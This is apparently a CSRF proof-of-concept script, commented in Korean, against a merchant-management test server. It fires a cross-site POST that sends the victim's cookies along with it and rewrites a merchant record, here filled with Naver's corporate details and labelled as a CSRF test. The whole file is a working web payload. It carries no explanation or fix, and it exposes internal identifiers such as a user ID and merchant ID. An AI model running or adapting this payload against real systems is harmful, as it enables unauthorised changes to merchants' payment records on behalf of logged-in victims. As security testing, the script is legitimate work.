const url = "https://nebs-test.eximvan.com/business/merchant/2/ajax/merchantModify.do";

// 요청에 필요한 데이터 설정
const data = new URLSearchParams({
    seqNo: "162",
    localMerchantName: "네이버주식회사-CSRF",
    agencyId: "KRPAGENCY1",
    hiddenAgencyId: "",
    merchantName: "naver corporation",
    secondaryMerchantName: "naver corporation",
    bizIdRefundYn: "Y",
    countryCode: "KR",
    postalCode: "13561",
    hqPostalCode: "",
    localAddress1: "경기도 성남시 분당구 정자일로 95(정자동)",
    localAddress2: "네이버",
    hqLocalAddress1: "",
    hqLocalAddress2: "",
    address1: "95, Jeongjail-ro, Bundang-gu, Seongnam-si, Gyeonggi-do",
    address2: "",
    representative: "최수연",
    category: "CA02",
    mainNumber: "02-1234-1234",
    email: "",
    bizType: "인터넷",
    bizItem: "인터넷",
    serviceTypeCC: "on",
    serviceTypeQR: "on",
    clearingChannelId: "",
    pTrsProviderName: "",
    pTrsMerchantId: "",
    pSeqNo: "",
    pTrsGoodsName: "",
    pStatus: "A000",
    hTrsProviderName: "",
    hTrsMerchantId: "",
    hSeqNo: "",
    hStatus: "A000",
    mTrsProviderName: "",
    mTrsMerchantId: "",
    mSeqNo: "",
    trsFaciliatorNum: "",
    mStatus: "A000",
    modUserId: "cwpark",
    modDt: "2024-10-18 11:12:36",
    status: "A000",
    historyReason: "CSRF 테스트 입니다.",
    merchantId: "M7B57D4367",
    sourceTableCode: "HT02"
});

// POST 요청 보내기
fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: data,
    credentials: 'include' // 쿠키를 자동으로 포함
});
